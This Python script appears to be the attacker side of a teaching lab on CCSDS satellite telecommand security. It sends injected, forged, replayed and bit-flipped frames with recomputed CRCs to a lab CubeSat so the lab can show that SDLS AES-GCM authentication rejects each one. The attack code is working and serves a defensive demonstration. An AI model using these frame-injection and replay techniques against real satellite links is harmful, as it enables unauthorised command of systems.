"""
Attacker - phase 2. The link is now protected with SDLS (AES-256-GCM).
The same attacks from phase 1 should fail, and every try should show up
as a SECURITY EVENT in the ground console.

The attacker does NOT have the keys (it does not read ground/keys_f2.json).

Scenarios:
  inject          the phase 1 attack as it is: valid CCSDS frame, no SDLS.
  forge           frame with a well formed SDLS header, but encrypted with a
                  made-up key: the MAC does not match.
  replay <hex>    sends a captured frame again (copy a "[AIR] encrypted TC sent"
                  line from the ground console): the IV was already used.
  tamper <hex>    changes one bit of the ciphertext of a captured frame and
                  COMPUTES THE CRC AGAIN: the CRC passes, but the MAC catches it.
  sniff <hex>     tries to read a captured frame: only the header is in clear.

Usage (in PowerShell, from the project folder):
    py attacks\\attack_f2.py --sat 192.168.33.105 inject
    py attacks\\attack_f2.py --sat 192.168.33.105 replay 00c5...

Only against your own C5, on your own network.
"""

import argparse
import os
import random
import secrets
import socket
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import frames, sdls, services  # noqa: E402
from ccsds.frames import CcsdsError  # noqa: E402

TC_PORT = 10025


def send_and_listen(sat: tuple, frame: bytes, wait: float = 2.0) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(wait)
        s.sendto(frame, sat)
        print(f"[ATTACKER] Frame sent ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
            print(f"[ATTACKER] The satellite answered ({len(data)} bytes), but it is encrypted: {data[:24].hex()}...")
        except (socket.timeout, ConnectionResetError):
            print("[ATTACKER] No answer: the satellite does not talk to anyone without the key.")
            print("           Look at the ground console: the SECURITY EVENT arrives there.")


def fix_crc(frame: bytearray) -> bytes:
    crc = frames.crc16(bytes(frame[:-2]))
    frame[-2:] = bytes([crc >> 8, crc & 0xFF])
    return bytes(frame)


def sniff(frame: bytes) -> None:
    try:
        f = frames.parse_tc_frame(frame)
    except CcsdsError as e:
        print(f"[ATTACKER] Frame can not be read: {e}")
        return
    print("[ATTACKER] What is visible in clear:")
    print(f"  SCID 0x{f.scid:03X}, channel {f.vcid}, N(S) {f.seq}")
    if len(f.data) < sdls.SEC_OVERHEAD + 1:
        print("  This frame has NO SDLS: the whole Space Packet is readable:", f.data.hex())
        return
    spi = int.from_bytes(f.data[:2], "big")
    iv = f.data[2:14]
    ct = f.data[14:-16]
    print(f"  SPI {spi}, IV #{sdls.iv_to_counter(iv)}")
    print(f"  Data ({len(ct)} bytes): {ct.hex()}  <- encrypted, you can not tell which command it is")
    print(f"  MAC: {f.data[-16:].hex()}")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Attacker (phase 2, only for your lab)")
    p.add_argument("--sat", required=False, help="IP of YOUR C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="scenario", required=True)
    sub.add_parser("inject", help="the phase 1 attack: frame without SDLS")
    sub.add_parser("forge", help="SDLS frame with a made-up key")
    for name, txt in (("replay", "send a captured frame again"),
                      ("tamper", "change one encrypted bit and compute the CRC again"),
                      ("sniff", "try to read a captured frame")):
        sp = sub.add_parser(name, help=txt)
        sp.add_argument("hex")
    args = p.parse_args(argv)

    if args.scenario != "sniff" and not args.sat:
        p.error("--sat with the IP of your C5 is missing")
    sat = (args.sat, args.port)
    red = bytes([255, 0, 0])

    if args.scenario == "inject":
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), red)
        frame = frames.build_tc_frame(pkt, seq=random.randint(0, 255))
        print("[ATTACKER] Repeating the phase 1 attack: perfect CCSDS frame, no SDLS.")
        send_and_listen(sat, frame)
        return 0

    if args.scenario == "forge":
        fake = sdls.SecurityAssociation(sdls.SPI_TC, secrets.token_bytes(32))
        pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), red)
        # Huge IV: if the satellite moved the anti-replay window before checking
        # the MAC, this attack would lock out the real ground station. It should not happen.
        frame = sdls.build_secure_tc_frame(fake, pkt, seq=random.randint(0, 255), iv_counter=2**63)
        print("[ATTACKER] Well formed SDLS frame (SPI 1, huge IV), encrypted with a made-up key.")
        send_and_listen(sat, frame)
        return 0

    try:
        frame = bytes.fromhex(args.hex)
    except ValueError:
        print("[ATTACKER] That hex is not valid. Copy the full frame from the ground console.")
        return 1

    if args.scenario == "sniff":
        sniff(frame)
        return 0
    if args.scenario == "tamper":
        if len(frame) < 5 + sdls.SEC_OVERHEAD + 3:
            print("[ATTACKER] That frame has no SDLS. Use one from gs_f2.py.")
            return 1
        mod = bytearray(frame)
        mod[5 + sdls.SEC_HEADER_LEN + 2] ^= 0x01   # one bit of the ciphertext
        frame = fix_crc(mod)
        print("[ATTACKER] I changed one bit of the ciphertext and computed the CRC again.")
    else:
        print("[ATTACKER] Sending a captured frame again, without changes.")
    send_and_listen(sat, frame)
    return 0


if __name__ == "__main__":
    sys.exit(main())
